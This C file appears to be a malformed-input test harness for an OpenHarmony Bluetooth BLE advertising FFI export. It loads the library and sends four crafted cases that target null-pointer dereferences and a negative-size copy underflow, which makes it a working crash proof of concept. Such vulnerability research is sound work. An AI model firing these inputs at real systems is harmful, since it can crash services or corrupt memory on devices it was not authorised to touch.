/* Malformed-input client for the OpenHarmony x86_64 CJ Bluetooth BLE
 * advertising exported ABI — triple-vulnerability function.
 * ABI source: communication_bluetooth frameworks/cj/ble/include/bluetooth_ble_ffi.h
 * Candidate under test: ParseManufactureDataParameters (:312)
 *   for (i < parameter.size) { parameter.head[i];          ← layer 1: head unchecked
 *     std::string(mValue.head, mValue.size);               ← layer 2: inner head unchecked
 *   }                                                        ← layer 3: negative size → size_t huge copy
 * No target implementation is copied into this client.
 *
 * Case matrix:
 *   0  valid: 1 manufacture data entry, 4-byte value       control
 *   1  outer head=NULL, size=1                              layer 1: outer null
 *   2  head valid, inner mValue.head=NULL, size=4            layer 2: inner null
 *   3  head valid, inner valid, mValue.size=-1              layer 3: neg → size_t huge
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

typedef struct { uint8_t *head; int64_t size; } CArrUI8;
typedef struct { uint16_t manufactureId; CArrUI8 manufactureValue; } NativeManufactureData;
typedef struct { NativeManufactureData *head; int64_t size; } CArrNativeManufactureData;
typedef struct { char *serviceUuid; CArrUI8 serviceValue; } NativeServiceData;
typedef struct { NativeServiceData *head; int64_t size; } CArrNativeServiceData;
typedef struct {
    CArrNativeManufactureData manufactureData;
    CArrNativeServiceData serviceData;
    bool includeDeviceName;
} NativeAdvertiseData;
typedef struct { int32_t interval; int32_t txPower; int32_t connectable; } NativeAdvertiseSetting;

_Static_assert(sizeof(void *) == 8, "x86_64 caller required");

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    if (argc != 2) return 2;
    void *library = dlopen(argv[1], RTLD_NOW | RTLD_LOCAL);
    if (!library) { fprintf(stderr, "load_error=%s\n", dlerror()); return 3; }

    void (*start_advert)(NativeAdvertiseSetting, NativeAdvertiseData,
                          NativeAdvertiseData *, int32_t *) =
        (void (*)(NativeAdvertiseSetting, NativeAdvertiseData, NativeAdvertiseData *, int32_t *))
        dlsym(library, "FfiBluetoothBleStartAdvertising");
    if (!start_advert) { fputs("missing BLE advertising export\n", stderr); return 4; }

    NativeAdvertiseSetting setting = { 160, 1, 1 };
    uint8_t mfr_data[] = { 0xAA, 0xBB, 0xCC, 0xDD };

    /* Case 0: valid */
    NativeManufactureData mfr0 = { 0x1234, { mfr_data, 4 } };
    NativeAdvertiseData adv0 = { { &mfr0, 1 }, { NULL, 0 }, false };

    /* Case 1: outer head = NULL, size = 1 */
    NativeAdvertiseData adv1 = { { NULL, 1 }, { NULL, 0 }, false };

    /* Case 2: inner manufactureValue.head = NULL, size = 4 */
    NativeManufactureData mfr2 = { 0x1234, { NULL, 4 } };
    NativeAdvertiseData adv2 = { { &mfr2, 1 }, { NULL, 0 }, false };

    /* Case 3: inner manufactureValue.size = -1 (size_t underflow → huge copy) */
    NativeManufactureData mfr3 = { 0x1234, { mfr_data, -1 } };
    NativeAdvertiseData adv3 = { { &mfr3, 1 }, { NULL, 0 }, false };

    const struct { NativeAdvertiseData adv; const char *name; } cases[] = {
        { adv0, "valid_control" },
        { adv1, "outer_head_null_layer1" },
        { adv2, "inner_value_null_layer2" },
        { adv3, "neg_size_sizet_underflow_layer3" },
    };

    for (size_t k = 0; k < sizeof(cases) / sizeof(cases[0]); k++) {
        printf("case=%zu name=%s start\n", k, cases[k].name);
        int32_t err = 0;
        start_advert(setting, cases[k].adv, NULL, &err);
        printf("case=%zu name=%s done err=%d\n", k, cases[k].name, err);
    }
    puts("malformed_matrix=completed_no_crash");
    return 0;
}
